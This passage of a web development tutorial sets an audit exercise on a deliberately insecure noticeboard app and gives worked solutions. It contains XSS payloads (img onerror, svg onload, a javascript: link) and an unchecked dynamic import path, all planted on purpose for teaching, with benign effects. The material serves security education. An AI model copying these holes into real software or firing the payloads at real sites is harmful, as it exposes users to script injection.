self.onmessage = (event: MessageEvent<StatsRequest>) => {
  const { listings } = event.data;
  // ...
  const result: StatsResponse = { duplicates, checked: listings.length };
  self.postMessage(result);
};
```

```ts
// main.ts
const statsWorker = new Worker(new URL("./stats-worker.ts", import.meta.url), {
  type: "module"
});

statsWorker.onmessage = (event: MessageEvent<StatsResponse>) => {
  const { duplicates, checked } = event.data;
  statsPanel.textContent = `Checked ${checked}, found ${duplicates.length} duplicates.`;
};
```

**What actually changes**

- `postMessage` is typed as `any` on both sides by default, so the two files can drift apart with nothing to catch it. A shared message interface is the entire benefit, and it is a large one - a mismatched worker contract fails silently at runtime with `undefined`.
- `MessageEvent<T>` is the generic that carries your type through to `event.data`.
- The `new URL(..., import.meta.url)` form is how Vite finds and bundles a worker. A bare string path works in the browser but the bundler cannot see it, so it will not be built. `type: "module"` is what lets the worker use `import`.
- Worker files need `"lib": ["WebWorker"]` to see `self` correctly. In a Vite project this usually means a separate `tsconfig` for the worker, or a `/// <reference lib="webworker" />` at the top of the file. Slightly annoying, and it will be your first error.

</details>

---

## Self-study task: audit and repair

You inherit a working noticeboard. Your job is not to rewrite it. It is to **audit it, fix it, and write down what you found**, which is what this work actually looks like in a team.

Six things are wrong with the code below. Some are performance problems, some are security problems, and some are both. Find them before you open the solution.

### Setup

`index.html`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Noticeboard</title>
  </head>
  <body>
    <h1>Block C noticeboard</h1>
    <input id="search" placeholder="Search listings...">
    <button id="runStats">Check for duplicates</button>
    <button id="showPanel">Show panel</button>
    <div id="stats"></div>
    <div id="panel"></div>
    <div id="board"></div>
    <script type="module" src="./main.js"></script>
  </body>
</html>
```

`main.js`:

```js
// The version you inherit. Three of these listings were not posted in good faith.

const listings = [];

for (let i = 0; i < 300; i++) {
  listings.push({
    id: `L-${i}`,
    title: i % 9 === 0 ? "Desk lamp" : `Item ${i}`,
    body: "Collect from block C, any evening.",
    price: i * 5,
    seller: `user${i}`,
    image: `https://picsum.photos/seed/${i}/320/200`,
    contact: `https://example.com/u/user${i}`
  });
}

listings.push({
  id: "L-901",
  title: `Free sofa <img src=x onerror="document.title='pwned-1'">`,
  body: "Good condition.",
  price: 0,
  seller: "anon",
  image: "https://picsum.photos/seed/sofa/320/200",
  contact: "https://example.com/u/anon"
});

listings.push({
  id: "L-902",
  title: "Bike lights",
  body: `Barely used <svg onload="document.title='pwned-2'"></svg>`,
  price: 80,
  seller: "anon",
  image: "https://picsum.photos/seed/lights/320/200",
  contact: "https://example.com/u/anon"
});

listings.push({
  id: "L-903",
  title: "Kettle",
  body: "Works fine.",
  price: 50,
  seller: "anon",
  image: "https://picsum.photos/seed/kettle/320/200",
  contact: "javascript:document.title='pwned-3'"
});

const board = document.querySelector("#board");
const search = document.querySelector("#search");
const statsPanel = document.querySelector("#stats");

function render(list) {
  board.innerHTML = "";

  for (const listing of list) {
    board.innerHTML += `
      <article class="card">
        <h2>${listing.title}</h2>
        <p>${listing.body}</p>
        <p class="price">${listing.price} kr</p>
        <img src="${listing.image}" alt="">
        <a href="${listing.contact}">Contact ${listing.seller}</a>
      </article>
    `;
  }
}

search.addEventListener("input", () => {
  const term = search.value.toLowerCase();
  render(listings.filter((l) => l.title.toLowerCase().includes(term)));
});

document.querySelector("#runStats").addEventListener("click", () => {
  statsPanel.textContent = "Checking...";

  const duplicates = [];
  for (let i = 0; i < listings.length; i++) {
    for (let j = i + 1; j < listings.length; j++) {
      if (listings[i].title === listings[j].title) {
        duplicates.push([listings[i].id, listings[j].id]);
      }
    }
  }

  statsPanel.textContent = `Found ${duplicates.length} duplicates.`;
});

document.querySelector("#showPanel").addEventListener("click", async () => {
  const name = new URLSearchParams(location.search).get("panel") || "map";
  const module = await import(`./panels/${name}.js`);
  module.render(document.querySelector("#panel"));
});

function login(token) {
  localStorage.setItem("accessToken", token);
}

function authedFetch(url) {
  return fetch(url, {
    headers: { Authorization: `Bearer ${localStorage.getItem("accessToken")}` }
  });
}

render(listings);
login("TOKEN-abc123");
```

The `panels/` directory does not exist, so the "Show panel" button will fail. Leave it failing; the bug there is not the missing file.

### The task

1. **Measure first.** Time the initial `render` with `performance.now()`, not by eye. The placeholder images arrive long after `render` has finished, so "the page still looks empty" is telling you about the network, not about the function you are timing. Then count how many times `render` runs when you type "lamp", and click "Check for duplicates" and try to scroll while it works.
2. **Find the payloads.** Three listings are hostile. Load the page and watch the browser tab title. Work out which position each payload exploits, and which one does nothing until you click it.
3. **Write the audit.** One row per finding:

| # | Finding | Performance, security, or both | Evidence | Fix | Verified by |
|---|---|---|---|---|---|

   *Evidence* is a number or a payload that fires. Not "this looks slow". *Verified by* is how you know it is fixed: the number afterwards, or the payload now sitting on the page as visible text.

4. **Repair it**, so every "Verified by" is true.
5. **Write one paragraph** about a decision where the two goals pulled against each other, what you chose, and what would change your mind.

Aim for six findings. If you get to the end without a single "both", look again at how the cards are built.

<details>
<summary><strong>Solution: the audit</strong></summary>

Numbers below are from a mid-range laptop. Yours will differ; what matters is the direction and the ranking.

| # | Finding | Category | Evidence | Fix | Verified by |
|---|---|---|---|---|---|
| 1 | `board.innerHTML +=` inside the render loop | **Both** | 303 cards take several hundred ms and the cost grows with the square of the list. Same line parses three attacker payloads into the DOM | `createElement` + `textContent`, batched through a `DocumentFragment`, one `replaceChildren` | Render time drops by roughly an order of magnitude; `document.title` stays put; payload text is visible on the card |
| 2 | Search renders on every keystroke | Performance | Typing "lamp" runs `render` 4 times | `debounce(..., 250)` | Counter reads 1 |
| 3 | Images have no `width`, `height` or `loading` | Performance | Page jumps as images arrive; all 303 requested at once | Set all three on the element | No layout shift; Network tab shows a handful of image requests, not 303. Picsum answers each one with a redirect to its CDN, so expect two entries per image |
| 4 | `contact` used as an `href` unchecked | Security | `L-903` sets the tab title when its link is clicked | `safeUrl()`, and no `href` at all if it fails | Link is inert; "Contact anon" still renders |
| 5 | Duplicate scan runs on the main thread | Performance | 303 listings is 45,753 comparisons and the page cannot be scrolled during it. Note it finds 561 pairs, since 34 listings share the title "Desk lamp" | Move the loop into a Web Worker, `postMessage` the result back | Page scrolls throughout; the count is unchanged |
| 6 | `import()` with a path from the query string | Security | `?panel=../../../anything` is a module path the visitor controls | An `Object.hasOwn` allow-list of literal import paths | Unknown names load nothing; the bundler can now split the two real panels |

**The `localStorage` token is not a finding.** It is a deliberate, defensible choice - see Finding 3 in the security round. Writing it up as a bug means you have not read that section. Writing it up as *a risk you are accepting on a stated condition* is exactly right, and it belongs in step 5 rather than in the table.

**Which payload does what.** `L-901` exploits the `<h2>` interpolation, `L-902` the `<p>` interpolation, and both fire on page load. `L-903` is the `href`, and it does nothing until somebody clicks. That last one is the important one: it is still live after you have rewritten the render function, which is precisely when everyone stops looking.

**If you tried `<script>alert(1)</script>` and saw nothing**, that is expected and it does not mean the code is safe. `innerHTML` does not execute injected `<script>` tags. `onerror` and `onload` handlers work perfectly, which is why the payloads above use them.

</details>

<details>
<summary><strong>Solution: the repaired render</strong></summary>

The rest of the repair follows the lesson body directly - `debounce` from Finding 2 of the performance round, the worker from Finding 4 of the same round, the allow-list from Finding 6 of the security round. The render function is the part worth writing out, because it is the one that fixes two categories at once.

```js
function safeUrl(value) {
  if (typeof value !== "string" || value.trim() === "") return "";

  try {
    const url = new URL(value, window.location.origin);
    return url.protocol === "https:" ? url.href : "";
  } catch {
    return "";
  }
}

function makeCard(listing) {
  const card = document.createElement("article");
  card.className = "card";

  const title = document.createElement("h2");
  title.textContent = listing.title;

  const body = document.createElement("p");
  body.textContent = listing.body;

  const price = document.createElement("p");
  price.className = "price";
  price.textContent = `${listing.price} kr`;

  const image = document.createElement("img");
  image.src = safeUrl(listing.image);
  image.alt = "";
  image.loading = "lazy";
  image.width = 320;
  image.height = 200;
  image.referrerPolicy = "no-referrer";

  const contact = document.createElement("a");
  const href = safeUrl(listing.contact);
  if (href) {
    contact.href = href;
  }
  contact.textContent = `Contact ${listing.seller}`;

  card.append(title, body, price, image, contact);
  return card;
}

function render(list) {
  const fragment = document.createDocumentFragment();

  for (const listing of list) {
    fragment.append(makeCard(listing));
  }

  board.replaceChildren(fragment);
}
```

And the panel button:

```js
const PANELS = {
  map: () => import("./panels/map.js"),
  stats: () => import("./panels/stats.js")
};

document.querySelector("#showPanel").addEventListener("click", async () => {
  const name = new URLSearchParams(location.search).get("panel") || "map";

  if (!Object.hasOwn(PANELS, name)) {
    document.querySelector("#panel").textContent = "Unknown panel.";
    return;
  }

  const module = await PANELS[name]();
  module.render(document.querySelector("#panel"));
});
```

**How to confirm it worked.** Reload with all three hostile listings still in the array. The tab title should stay as you set it, "Free sofa &lt;img src=x onerror=..." should be sitting on a card as readable text, and the "Contact anon" on `L-903` should be plain text with nothing to click. Then type "lamp" and check the render counter says 1, and click the duplicate button and confirm you can still scroll.

</details>

<details>
<summary><strong>Solution: a sample trade-off paragraph</strong></summary>

One answer of many. Yours should name a decision from your own repair, not repeat this one.

> The duplicate scan moved into a Web Worker, which meant `postMessage`-ing the whole 303-listing array across the thread boundary. `postMessage` structured-clones its argument, so this copies the entire dataset on every click - measurable waste that the main-thread version did not have. I accepted it because a few hundred small objects clone in well under the time the scan itself takes, and an unresponsive page is a cost the user actually feels while a redundant copy is not. What would change my mind: a list an order of magnitude larger, or listings carrying image blobs rather than URLs. At that point I would send only the fields the scan needs, or move to a transferable `ArrayBuffer`, and the extra complexity would be worth it.

What makes this a trade-off paragraph rather than a summary: it names a cost that the fix introduced, not just the problem the fix solved, and it states a condition under which the answer flips. "I used a Web Worker so the page stays responsive" is a description of a fix. It is not this.

</details>

## Further reading

- [Element: innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML) and [Node: textContent](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent) on MDN. Read both pages, in that order, in one sitting.
- [DocumentFragment](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment) on MDN.
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html). Dense, and the best thing written on the subject.
- [OWASP Top Ten](https://owasp.org/www-project-top-ten/).
- [Using Web Workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers) on MDN.
- [SameSite cookies explained](https://web.dev/articles/samesite-cookies-explained) on web.dev.
- [DOMPurify](https://github.com/cure53/DOMPurify), for the day you genuinely have to render HTML.
